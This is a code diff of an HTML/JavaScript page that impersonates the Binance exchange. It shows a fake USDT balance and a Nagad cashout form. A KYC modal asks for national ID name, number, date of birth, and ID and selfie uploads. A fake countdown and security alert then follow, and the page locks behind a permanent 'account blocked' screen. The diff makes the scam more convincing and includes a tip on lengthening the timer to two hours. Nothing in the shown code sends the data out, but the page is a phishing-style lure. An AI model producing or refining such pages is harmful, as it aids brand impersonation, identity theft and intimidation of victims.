@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance Pro - Security Protocol</title>
+    <title>Binance Pro - Secure Wallet</title>
     <style>
         :root {
             --binance-yellow: #FCD535;
@@ -11,130 +11,159 @@
             --card-bg: #2B3139;
             --text-gray: #848E9C;
             --error-red: #f6465d;
+            --success-green: #0ecb81;
         }
 
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0B0E11; color: white; margin: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #0B0E11; color: white; margin: 0; overflow-x: hidden; }
         
-        /* Main Layout */
-        #app-container { display: flex; }
-        .sidebar { width: 250px; background-color: var(--bg-dark); height: 100vh; padding: 20px; border-right: 1px solid #333; }
-        .main { flex-grow: 1; padding: 30px; }
-        .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #333; }
-        
-        /* Block Screen Style */
+        /* Account Blocked Screen Style */
         #block-screen {
             display: none; position: fixed; top:0; left:0; width: 100%; height:100%;
             background: #0B0E11; z-index: 10000; flex-direction: column;
             justify-content: center; align-items: center; text-align: center;
         }
 
+        #app-container { display: flex; }
+        .sidebar { width: 260px; background-color: var(--bg-dark); height: 100vh; padding: 25px; border-right: 1px solid #333; position: fixed; }
+        .main { margin-left: 310px; flex-grow: 1; padding: 30px; }
+        
+        .card { background-color: var(--card-bg); padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #333; }
+        .price-display { font-size: 36px; font-weight: bold; color: var(--binance-yellow); margin: 10px 0; }
+        
+        input { background: #12161c; border: 1px solid #444; color: white; padding: 12px; border-radius: 6px; width: 100%; box-sizing: border-box; margin-bottom: 15px; }
+        .btn-yellow { background: var(--binance-yellow); color: black; font-weight: bold; padding: 14px; border: none; border-radius: 6px; width: 100%; cursor: pointer; font-size: 16px; }
+
         /* KYC Modal */
         #kycModal {
             display: none; position: fixed; z-index: 999; left: 0; top: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); justify-content: center; align-items: center;
+            background: rgba(0,0,0,0.9); justify-content: center; align-items: center;
         }
-        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 400px; }
-        
-        input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: none; }
-        input { background: #12161c; color: white; border: 1px solid #444; }
-        .btn-yellow { background: var(--binance-yellow); color: black; font-weight: bold; cursor: pointer; }
-        
-        .timer-box { color: var(--binance-yellow); font-size: 20px; font-weight: bold; }
+        .modal-box { background: var(--card-bg); padding: 30px; border-radius: 15px; width: 420px; border: 1px solid var(--binance-yellow); }
     </style>
 </head>
 <body>
 
     <div id="block-screen">
-        <h1 style="color: var(--error-red); font-size: 50px;">🚫 Account Blocked</h1>
-        <p style="font-size: 18px; color: var(--text-gray);">Your account has been permanently suspended due to: <br><b>Illegal Withdrawal Attempt & Verification Failure.</b></p>
-        <p>Security Code: ERR_BLOCK_9921</p>
-        <button onclick="location.reload()" style="width: 200px; background: #333; color: white; cursor: pointer;">Appeal Suspension</button>
+        <div style="background: rgba(246, 70, 93, 0.1); padding: 40px; border-radius: 20px; border: 1px solid var(--error-red);">
+            <h1 style="color: var(--error-red); font-size: 45px; margin: 0;">ACCESS DENIED</h1>
+            <p style="font-size: 18px; color: #ccc; margin-top: 20px;">Your account has been <b>Permanently Blocked</b>.</p>
+            <p style="color: var(--text-gray);">Reason: Multiple Verification Failures & Suspicious Activity.</p>
+            <div style="margin-top: 30px; font-family: monospace; color: #555;">ERROR_CODE: 0x882_BN_BLOCK</div>
+        </div>
     </div>
 
     <div id="app-container">
         <div class="sidebar">
-            <h2 style="color: var(--binance-yellow);">BINANCE</h2>
-            <p>Wallet: <span id="side-balance">5.00</span> USDT</p>
+            <div style="color: var(--binance-yellow); font-size: 24px; font-weight: bold; margin-bottom: 40px;">BINANCE</div>
+            <div style="color: var(--text-gray); font-size: 14px;">Dashboard</div>
+            <div style="margin-top: 20px; padding: 10px; background: #333; border-radius: 5px;">Spot: $200.00</div>
         </div>
 
         <div class="main">
             <div class="card">
-                <h3>Total Balance</h3>
-                <h1 id="main-balance" style="color: var(--binance-yellow);">$5.00</h1>
+                <span style="color: var(--text-gray);">Estimated Portfolio Balance</span>
+                <div class="price-display" id="balance-text">$200.00</div>
+                <span style="color: var(--success-green); font-size: 14px;">+2.45% (Today)</span>
             </div>
 
-            <div class="card">
-                <h3>Withdrawal via Nagad</h3>
-                <input type="text" id="nagad-num" placeholder="Nagad Number">
-                <input type="number" id="amt" placeholder="Amount (USDT)">
-                <button class="btn-yellow" onclick="showKYC()">Withdraw Now</button>
-            </div>
+            <div class="grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                <div class="card">
+                    <h3>Nagad Cashout</h3>
+                    <label style="font-size: 12px; color: var(--text-gray);">Nagad Account Number</label>
+                    <input type="text" id="n-num" placeholder="017XXXXXXXX">
+                    <label style="font-size: 12px; color: var(--text-gray);">Withdrawal Amount (USDT)</label>
+                    <input type="number" id="n-amt" placeholder="Max $200">
+                    <button class="btn-yellow" onclick="openKYC()">Withdraw Funds</button>
+                </div>
 
-            <div id="status-card" class="card" style="display: none;">
-                <h3>System Status</h3>
-                <p id="status-msg">Verification Pending...</p>
-                <div class="timer-box" id="timer">02:00:00</div>
+                <div class="card" id="status-card" style="display: none;">
+                    <h3>Process Status</h3>
+                    <p id="msg" style="color: var(--binance-yellow);">Verifying Identity...</p>
+                    <div id="timer" style="font-size: 24px; font-weight: bold; letter-spacing: 2px;">02:00:00</div>
+                    <p style="font-size: 11px; color: var(--text-gray); margin-top: 10px;">Do not close this window. Verification is in progress.</p>
+                </div>
             </div>
         </div>
     </div>
 
     <div id="kycModal">
-        <div class="modal-content">
-            <h2 style="text-align: center;">KYC Identity</h2>
+        <div class="modal-box">
+            <h2 style="text-align: center; color: var(--binance-yellow);">KYC Verification</h2>
+            <p style="text-align: center; font-size: 12px; color: var(--text-gray);">Standard procedure for first-time withdrawals.</p>
+            
             <label>NID Full Name</label>
-            <input type="text" id="k-name">
-            <label>NID Number</label>
-            <input type="text" id="k-nid">
-            <label>Upload NID & Selfie</label>
-            <input type="file" multiple>
-            <button class="btn-yellow" onclick="startBlockProcess()">Submit & Verify</button>
+            <input type="text" id="k-name" placeholder="Name as per NID">
+            
+            <label>NID Card Number</label>
+            <input type="text" id="k-nid" placeholder="10 or 17 digit NID">
+            
+            <label>Date of Birth</label>
+            <input type="date">
+            
+            <label>Upload NID & Selfie (Face)</label>
+            <input type="file" multiple style="border: none; background: none; padding-left: 0;">
+            
+            <button class="btn-yellow" onclick="startProcessing()">Submit & Process</button>
         </div>
     </div>
 
     <script>
-        // Check if user is already blocked
-        if (localStorage.getItem('isBlocked') === 'true') {
-            document.getElementById('block-screen').style.display = 'flex';
-            document.getElementById('app-container').style.display = 'none';
+        // Default Balance Logic
+        let currentBalance = 200.00;
+
+        // Check Block Status on Load
+        window.onload = function() {
+            if (localStorage.getItem('acc_blocked') === 'true') {
+                showBlockScreen();
+            }
+        };
+
+        function openKYC() {
+            const amt = document.getElementById('n-amt').value;
+            if (amt > 0 && amt <= currentBalance) {
+                document.getElementById('kycModal').style.display = 'flex';
+            } else {
+                alert("Insufficient Balance or Invalid Amount!");
+            }
         }
 
-        function showKYC() {
-            document.getElementById('kycModal').style.display = 'flex';
-        }
-
-        function startBlockProcess() {
+        function startProcessing() {
             const name = document.getElementById('k-name').value;
             const nid = document.getElementById('k-nid').value;
-            
-            if(!name || !nid) { alert("Please complete info"); return; }
+
+            if (!name || !nid) {
+                alert("Please fill all identity fields.");
+                return;
+            }
 
             document.getElementById('kycModal').style.display = 'none';
             document.getElementById('status-card').style.display = 'block';
-            
-            // Start the 2-hour (simulated) timer
-            let totalSeconds = 7200; // 2 hours
 
-            const interval = setInterval(() => {
-                totalSeconds--;
-                let hrs = Math.floor(totalSeconds / 3600);
-                let mins = Math.floor((totalSeconds % 3600) / 60);
-                let secs = totalSeconds % 60;
+            // Timer Simulation (Set to 10 seconds for test, change 10 to 7200 for 2 hours)
+            let timeLeft = 10; 
+            const countdown = setInterval(() => {
+                timeLeft--;
                 
-                document.getElementById('timer').innerText = 
-                    `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                // Format HH:MM:SS
+                let h = Math.floor(timeLeft / 3600).toString().padStart(2, '0');
+                let m = Math.floor((timeLeft % 3600) / 60).toString().padStart(2, '0');
+                let s = (timeLeft % 60).toString().padStart(2, '0');
+                document.getElementById('timer').innerText = `${h}:${m}:${s}`;
 
-                // Simulation: Force block after 10 seconds for testing
-                // If you want real 2 hours, change 10 to 7200
-                if (totalSeconds <= 7190) { 
-                    clearInterval(interval);
-                    triggerBlock();
+                if (timeLeft <= 0) {
+                    clearInterval(countdown);
+                    handleBlock();
                 }
             }, 1000);
         }
 
-        function triggerBlock() {
-            alert("ALERT: Security violation detected. System flagged your account.");
-            localStorage.setItem('isBlocked', 'true');
+        function handleBlock() {
+            alert("Security Alert: The NID/Account details provided do not match our records. Your account is being flagged.");
+            localStorage.setItem('acc_blocked', 'true');
+            showBlockScreen();
+        }
+
+        function showBlockScreen() {
             document.getElementById('block-screen').style.display = 'flex';
             document.getElementById('app-container').style.display = 'none';
         }
